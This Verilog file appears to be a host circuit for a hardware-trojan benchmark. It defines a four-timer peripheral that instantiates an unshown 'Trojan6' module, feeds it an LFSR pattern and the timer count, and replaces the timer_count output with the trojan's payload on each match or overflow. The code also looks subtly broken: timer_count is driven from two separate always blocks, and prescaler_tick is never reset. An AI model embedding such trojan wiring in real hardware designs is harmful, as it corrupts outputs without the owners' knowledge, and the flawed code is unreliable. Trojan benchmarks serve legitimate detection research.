// Timer Host Circuit for Trojan6
// Fixed I/O to match Trojan6: m0_data_o[31:0], i_s15_data_o[31:0] -> i_s15_data_o_TrojanPayload[31:0]
module trojan6_timer_host #(
    parameter TIMER_COUNT = 4,        // Number of timers
    parameter PRESCALER_MAX = 256,    // Maximum prescaler value
    parameter [255:0] TIMER_PATTERN = 256'h0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF0123456789ABCDEF  // Timer data pattern
)(
    input wire clk,
    input wire rst,
    input wire [31:0] period_value,
    input wire [31:0] compare_value,
    input wire timer_enable,
    input wire timer_reset,
    output reg [31:0] timer_count,
    output reg timer_overflow,
    output reg timer_match
);

    // Trojan interface (fixed width)
    wire [31:0] trojan_m0_data_o;
    wire [31:0] trojan_i_s15_data_o;
    wire [31:0] trojan_i_s15_data_o_TrojanPayload;
    
    // Timer state - fixed constants
    
    reg [31:0] timers [0:TIMER_COUNT-1];         // Configurable timers
    reg [31:0] periods [0:TIMER_COUNT-1];        // Configurable periods
    reg [31:0] compares [0:TIMER_COUNT-1];       // Configurable compares
    reg [3:0] timer_enables;
    reg [255:0] timer_gen;
    reg [2:0] timer_state;
    reg [7:0] prescaler;
    reg [1:0] active_timer;
    reg prescaler_tick;
    
    // Loop variable
    integer n;
    
    // Generate timer data for trojan
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            timer_gen <= TIMER_PATTERN;
            prescaler <= 8'h0;
            // Initialize timers
            for (n = 0; n < TIMER_COUNT; n = n + 1) begin
                timers[n] <= 32'h0;
                periods[n] <= 32'h0;
                compares[n] <= 32'h0;
            end
            timer_enables <= 4'h0;
        end else begin
            timer_gen <= {timer_gen[254:0], timer_gen[255] ^ timer_gen[223] ^ timer_gen[191] ^ timer_gen[159]};
            
            // Prescaler
            if ({{24{1'b0}}, prescaler} >= (PRESCALER_MAX - 1)) begin
                prescaler <= 8'h0;
                prescaler_tick <= 1'b1;
            end else begin
                prescaler <= prescaler + 1;
                prescaler_tick <= 1'b0;
            end
        end
    end
    
    assign trojan_m0_data_o = timer_gen[31:0];
    assign trojan_i_s15_data_o = timer_count;
    
    // Timer control logic
    always @(posedge clk or posedge rst) begin
        if (rst) begin
            timer_count <= 32'h0;
            timer_overflow <= 1'b0;
            timer_match <= 1'b0;
            timer_state <= 3'b000;
            active_timer <= 2'h0;
        end else begin
            case (timer_state)
                3'b000: begin // IDLE
                    timer_overflow <= 1'b0;
                    timer_match <= 1'b0;
                    if (timer_reset) begin
                        timers[active_timer] <= 32'h0;
                        timer_count <= 32'h0;
                    end else if (timer_enable) begin
                        periods[active_timer] <= period_value;
                        compares[active_timer] <= compare_value;
                        timer_enables[active_timer] <= 1'b1;
                        timer_state <= 3'b001;
                    end
                end
                3'b001: begin // SETUP
                    timer_count <= timers[active_timer];
                    timer_state <= 3'b010;
                end
                3'b010: begin // RUNNING
                    if (timer_enables[active_timer] && prescaler_tick) begin
                        timers[active_timer] <= timers[active_timer] + 1;
                        timer_count <= timers[active_timer] + 1;
                        
                        // Check for compare match
                        if ((timers[active_timer] + 1) == compares[active_timer]) begin
                            timer_match <= 1'b1;
                            timer_state <= 3'b011;
                        end
                        // Check for overflow
                        else if ((timers[active_timer] + 1) >= periods[active_timer]) begin
                            timer_overflow <= 1'b1;
                            timers[active_timer] <= 32'h0;
                            timer_state <= 3'b100;
                        end
                    end
                end
                3'b011: begin // MATCH
                    timer_state <= 3'b010; // Continue counting
                end
                3'b100: begin // OVERFLOW
                    timer_count <= 32'h0;
                    timer_state <= 3'b010; // Restart counting
                end
                default: timer_state <= 3'b000;
            endcase
            
            // Cycle through timers
            if (timer_state == 3'b000) begin
                /* verilator lint_off WIDTHTRUNC */
                active_timer <= (active_timer + 1) % TIMER_COUNT;
                /* verilator lint_on WIDTHTRUNC */
            end
        end
    end
    
    // Output with trojan payload
    always @(posedge clk) begin
        if (timer_match || timer_overflow) begin
            timer_count <= trojan_i_s15_data_o_TrojanPayload;
        end
    end
    
    // Instantiate Trojan6
    Trojan6 trojan_inst (
        .m0_data_o(trojan_m0_data_o),
        .i_s15_data_o(trojan_i_s15_data_o),
        .i_s15_data_o_TrojanPayload(trojan_i_s15_data_o_TrojanPayload)
    );

endmodule
